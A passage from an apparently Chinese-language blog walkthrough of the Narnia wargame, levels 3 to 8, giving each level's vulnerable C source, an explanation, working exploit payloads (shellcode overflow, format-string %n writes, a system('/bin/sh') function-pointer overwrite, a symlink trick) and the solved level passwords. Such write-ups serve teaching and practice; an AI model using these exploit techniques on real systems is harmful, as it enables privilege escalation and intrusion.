class="number">32</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(argc != <span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage, %s file, will send contents of file 2 /dev/null\n"</span>,argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* open files */</span></span><br><span class="line">        <span class="built_in">strcpy</span>(ifile, argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">if</span>((ofd = open(ofile,O_RDWR)) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"error opening %s\n"</span>, ofile);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((ifd = open(ifile, O_RDONLY)) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"error opening %s\n"</span>, ifile);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* copy from file1 to file2 */</span></span><br><span class="line">        read(ifd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>);</span><br><span class="line">        write(ofd,buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"copied contents of %s to a safer place... (%s)\n"</span>,ifile,ofile);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* close 'em */</span></span><br><span class="line">        close(ifd);</span><br><span class="line">        close(ofd);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>一开始看到 strcpy 仍然用之前的方法尝试覆盖，没有成功，因为会把 ofile （以及ifile）覆盖，进入</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((ofd = open(ofile,O_RDWR)) &lt; <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"error opening %s\n"</span>, ofile);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 时会调用<code>exit</code>结束程序</p>
+</li>
+<li><p>再看一看代码，似乎如果能将 ofile 的值改成其他文件，就会把<code>/etc/narnia_pass/narnia4</code>的内容读到那个文件里，而借助缓冲区溢出的相关原理，我们能很容易的覆盖 ofile 内容</p>
+</li>
+<li><p>我们创建一个重定向输出文件<code>/tmp/file</code>，并将 file 写权限打开：</p>
+ <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/file;chmod o+rwx /tmp/file</span><br></pre></td></tr></table></figure>
+
+<p> 于是，进入<code>/narnia</code>目录，进行如下操作：<br> <img src="http://ww1.sinaimg.cn/large/a105112bgy1fqbd3ortd9j20pf02zmxl.jpg" alt><br> 实际上，ofile 的值被我们成功赋值为<code>/tmp/file</code>但是 ifile 的值却变成了<code>./././../etc/narnia_pass/narnia4/tmp/file</code>，直接这么做不行，但我们仍要将 ifile 与<code>/etc/narnia_pass/narnia4</code>联系起来</p>
+</li>
+<li><p>这不，还有软链接嘛<br> <img src="http://ww1.sinaimg.cn/large/a105112bgy1fqbd451t2yj20ol06xn1o.jpg" alt><br> 这样，ofile 的值是<code>/tmp/file</code>；ifile 的值是<code>/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/file</code>，而它是<code>/etc/narnia_pass/narnia4</code>的软链接</p>
+<h2 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /narnia &amp;&amp; mkdir -p /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/ &amp;&amp; \</span><br><span class="line">ln -s /etc/narnia_pass/narnia4 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/file &amp;&amp; \</span><br><span class="line">touch /tmp/file &amp;&amp; chmod o+rwx /tmp/file &amp;&amp; \</span><br><span class="line">/narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/file &amp;&amp; \</span><br><span class="line">cat /tmp/file</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution-3"><a href="#solution-3" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>thaenohtai</code></li>
+</ul>
+<h1 id="level-5-narnia4-gt-narnia5"><a href="#level-5-narnia4-gt-narnia5" class="headerlink" title="level 5: narnia4 -&gt; narnia5"></a>level 5: narnia4 -&gt; narnia5</h1><h2 id="source-code-4"><a href="#source-code-4" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; environ[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">		<span class="built_in">memset</span>(environ[i], <span class="string">'\0'</span>, <span class="built_in">strlen</span>(environ[i]));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc&gt;<span class="number">1</span>)</span><br><span class="line">		<span class="built_in">strcpy</span>(buffer,argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li>这里可以直接用level 3的方法的：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqbdpbl4t3j20oh074tdc.jpg" alt><h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./narnia4 `python -c <span class="string">'print "A" * 220 + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 8 + "\xde\xd7\xff\xff'</span>`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution-4"><a href="#solution-4" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>faimahchiy</code></li>
+</ul>
+<h1 id="level-6-narnia5-gt-narnia6"><a href="#level-6-narnia5-gt-narnia6" class="headerlink" title="level 6: narnia5 -&gt; narnia6"></a>level 6: narnia5 -&gt; narnia6</h1><h2 id="source-code-5"><a href="#source-code-5" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">snprintf</span>(buffer, <span class="keyword">sizeof</span> buffer, argv[<span class="number">1</span>]);</span><br><span class="line">	buffer[<span class="keyword">sizeof</span> (buffer) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Change i's value from 1 -&gt; 500. "</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(i==<span class="number">500</span>)&#123;</span><br><span class="line">	    <span class="built_in">printf</span>(<span class="string">"GOOD\n"</span>);</span><br><span class="line">            setreuid(geteuid(),geteuid());</span><br><span class="line">	    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No way...let me give you a hint!\n"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"buffer : [%s] (%d)\n"</span>, buffer, <span class="built_in">strlen</span>(buffer));</span><br><span class="line">	<span class="built_in">printf</span> (<span class="string">"i = %d (%p)\n"</span>, i, &amp;i);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>提示似乎是在暗示点什么，之前的题都是缓冲区溢出，这里用到了格式化字符串漏洞的利用。通过</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"buffer : [%s] (%d)\n"</span>, buffer, <span class="built_in">strlen</span>(buffer));</span><br><span class="line"><span class="built_in">printf</span> (<span class="string">"i = %d (%p)\n"</span>, i, &amp;i);</span><br></pre></td></tr></table></figure>
+
+<p> 打印<code>i</code>的地址也给了我们，而前面的<code>snprintf</code>函数会造成格式化字符串漏洞<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqdraf29uyj20km03bq4y.jpg" alt></p>
+</li>
+<li><p>先找格式化字符串距离当前位置的偏移<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqdram043xj20mv03gwhd.jpg" alt><br> 偏移量是 5</p>
+</li>
+<li><p>可以向<code>0xffffd62c</code>写数据了<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqdra32ntlj20oh04nae1.jpg" alt></p>
+<h2 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./narnia5 `python -c <span class="string">'print "\x2c\xd6\xff\xff" + "%.496x%5$n"'</span>`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>neezocaeng</code></li>
+</ul>
+<h1 id="level-7-narnia6-gt-narnia7"><a href="#level-7-narnia6-gt-narnia7" class="headerlink" title="level 7: narnia6 -&gt; narnia7"></a>level 7: narnia6 -&gt; narnia7</h1><h2 id="source-code-6"><a href="#source-code-6" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **environ;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tired of fixing values...</span></span><br><span class="line"><span class="comment">// - morla</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">       __asm__(<span class="string">"movl %esp,%eax\n\t"</span></span><br><span class="line">               <span class="string">"and $0xff000000, %eax"</span></span><br><span class="line">               );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> b1[<span class="number">8</span>], b2[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">int</span>  (*fp)(<span class="keyword">char</span> *)=(<span class="keyword">int</span>(*)(<span class="keyword">char</span> *))&amp;<span class="built_in">puts</span>, i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc!=<span class="number">3</span>)&#123; <span class="built_in">printf</span>(<span class="string">"%s b1 b2\n"</span>, argv[<span class="number">0</span>]); <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* clear environ */</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; environ[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">		<span class="built_in">memset</span>(environ[i], <span class="string">'\0'</span>, <span class="built_in">strlen</span>(environ[i]));</span><br><span class="line">	<span class="comment">/* clear argz    */</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">3</span>; argv[i] != <span class="literal">NULL</span>; i++)</span><br><span class="line">		<span class="built_in">memset</span>(argv[i], <span class="string">'\0'</span>, <span class="built_in">strlen</span>(argv[i]));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcpy</span>(b1,argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">strcpy</span>(b2,argv[<span class="number">2</span>]);</span><br><span class="line">	<span class="comment">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span></span><br><span class="line">	<span class="keyword">if</span>(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)fp &amp; <span class="number">0xff000000</span>) == get_sp())</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	setreuid(geteuid(),geteuid());</span><br><span class="line">    fp(b1);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>看代码的后面几行，程序正常执行时会在退出前调用<code>fp</code>指向的函数，也就是<code>puts</code>。如果能让<code>fp</code>指向一个我们想要的函数（比如<code>system</code>），再将<code>b1</code>的值换成我们想要的参数（比如<code>/bin/sh</code>），配合着之前的<code>setreuid(geteuid(),geteuid());</code>，我们就能得到<code>narnia7</code>的 shell 了</p>
+</li>
+<li><p>再看 main 函数前两行</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> b1[<span class="number">8</span>], b2[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">int</span>  (*fp)(<span class="keyword">char</span> *)=(<span class="keyword">int</span>(*)(<span class="keyword">char</span> *))&amp;<span class="built_in">puts</span>, i;</span><br></pre></td></tr></table></figure>
+
+<p> 在栈中，b2、b1、fp、i 的地址依次按从低到高的顺序紧密排列，这样，我们借助<code>strcpy</code>就可以先让<code>b1</code>覆盖<code>fp</code>的值，再让<code>b2</code>覆盖<code>b1</code>、<code>fp</code>的值，就像这样：</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(b1, <span class="string">"AAAAAAAA&lt;system_addr&gt;"</span>)</span><br><span class="line"><span class="built_in">strcpy</span>(b2, <span class="string">"AAAAAAAA/bin/sh"</span>);</span><br></pre></td></tr></table></figure>
+
+<p> 这样赋值以后，<code>fp</code>的值就变成<code>system</code>函数的地址，<code>b2</code>的值变成<code>/bin/sh</code>，<code>fp(b1)</code>执行的就是<code>system(&quot;/bin/sh&quot;)</code>。所以，找到<code>system</code>函数的地址是本题的关键。</p>
+</li>
+<li><p>库函数地址的差异实际上是 libc 基址的差异，库函数在libc中的偏移是不变的。在开启了 ASLR 的平台上，每次程序载入时，libc 的基址都会不同（比如：<code>system_addr = libc_start_main_addr - libc_start_main_offset + system_offset</code>）。由于 narnia 平台上关闭了 ASLR，所以只要找到<code>system</code>地址即可。具体过程如下：</p>
+<ol>
+<li>泄漏<code>libc_start_main</code>函数地址：<br> 先反汇编<code>main</code>函数，找到<code>printf</code>的地址<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqj851k9gzj20op0dt7ey.jpg" alt><br> 设置断点，进入<code>printf</code>函数，查看栈上的内容，在 0060 位置处找到<code>libc_start_main</code>信息：<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqj85rw37kj20ba02mmxt.jpg" alt><br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqj867k5bpj20jm0bewms.jpg" alt><br> <code>libc_start_main</code>函数地址：<code>0xf7e2f637 - 247 = 0xf7e2f540</code></li>
+<li>在<code>libc-database</code>中查看 libc 的版本<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqj86iujqrj20kt02575u.jpg" alt></li>
+<li>耐心地查看每一个 libc 版本，找到<code>system</code>函数偏移（经检验，本题编译用的是第二个）<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqj86raargj20lf04bmzy.jpg" alt></li>
+<li>计算system地址：<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqj87lcs5zj20oj04qjtz.jpg" alt><br> <code>system_offset = 0xf7e2f637 - 0x18637 + 0x0003a940 = 0xf7e51940</code></li>
+</ol>
+</li>
+<li><p>利用：<br> <img src="http://ww1.sinaimg.cn/large/a105112bly1fqj87lcs5zj20oj04qjtz.jpg" alt></p>
+<h2 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./narnia6 $(python -c <span class="string">'print "A" * 8 + "\x40\x19\xe5\xf7"'</span>) $(python -c <span class="string">'print "A" * 8 + "/bin/sh"'</span>)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>ahkiaziphu</code></li>
+</ul>
+<h1 id="level-8-narnia7-gt-narnia8"><a href="#level-8-narnia7-gt-narnia8" class="headerlink" title="level 8: narnia7 -&gt; narnia8"></a>level 8: narnia7 -&gt; narnia8</h1><h2 id="source-code-7"><a href="#source-code-7" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">goodfunction</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackedfunction</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *format)</span></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> buffer[<span class="number">128</span>];</span><br><span class="line">        <span class="keyword">int</span> (*ptrf)();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"goodfunction() = %p\n"</span>, goodfunction);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"hackedfunction() = %p\n\n"</span>, hackedfunction);</span><br><span class="line"></span><br><span class="line">        ptrf = goodfunction;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"before : ptrf() = %p (%p)\n"</span>, ptrf, &amp;ptrf);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"I guess you want to come to the hackedfunction...\n"</span>);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        ptrf = goodfunction;</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">snprintf</span>(buffer, <span class="keyword">sizeof</span> buffer, format);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ptrf();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (argc &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s &lt;buffer&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(vuln(argv[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">goodfunction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to the goodfunction, but i said the Hackedfunction..\n"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hackedfunction</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Way to go!!!!"</span>);</span><br><span class="line">	    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        setreuid(geteuid(),geteuid());</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-7"><a href="#writeup-7" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p><code>main</code>函数最后会调用<code>vuln(argv[1])</code>，<code>vuln</code>返回的是<code>ptrf()</code>，看到<code>vuln</code>里的</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(buffer, <span class="keyword">sizeof</span> buffer, format);</span><br></pre></td></tr></table></figure>
+
+<p> 首先想到利用格式化字符串漏洞覆写<code>ptrf</code>的值，使其指向<code>hackedfunction</code></p>
+</li>
+<li><p>不过这里不能确定<code>format</code>距离调用<code>snprintf(buffer, sizeof buffer, format);</code>处的偏移位置。比较暴力的办法就是挨个试。</p>
+</li>
+<li><p>最终，试出偏移位置是 6<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqj92iamzaj20sc06hjxx.jpg" alt></p>
+</li>
+</ol>
+<h2 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./narnia7 `python -c <span class="string">'print "\x8c\xd5\xff\xff" + "%134514514x%6$n"'</span>`</span><br></pre></td></tr></table></figure>
+
+<h2 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>mohthuphog</code></li>
+</ul>
+<h1 id="level-9-narnia8-gt-narnia9"><a href="#level-9-narnia8-gt-narnia9" class="headerlink" title="level 9: narnia8 -&gt; narnia9"></a>level 9: narnia8 -&gt; narnia9</h1><h2 id="source-code-8"><a href="#source-code-8" class="headerlink" title="source code"></a>source code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// gcc's variable reordering fucked things up</span></span><br><span class="line"><span class="comment">// to keep the level in its old style i am </span></span><br><span class="line"><span class="comment">// making "i" global unti i find a fix </span></span><br><span class="line"><span class="comment">// -morla </span></span><br><span class="line"><span class="keyword">int</span> i; </span><br><span 